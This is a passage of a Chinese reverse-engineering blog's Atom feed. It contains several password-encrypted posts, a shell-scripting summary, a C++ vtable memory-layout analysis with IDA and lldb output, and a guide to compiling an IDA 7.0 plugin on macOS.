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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-05-10T08:14:52.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
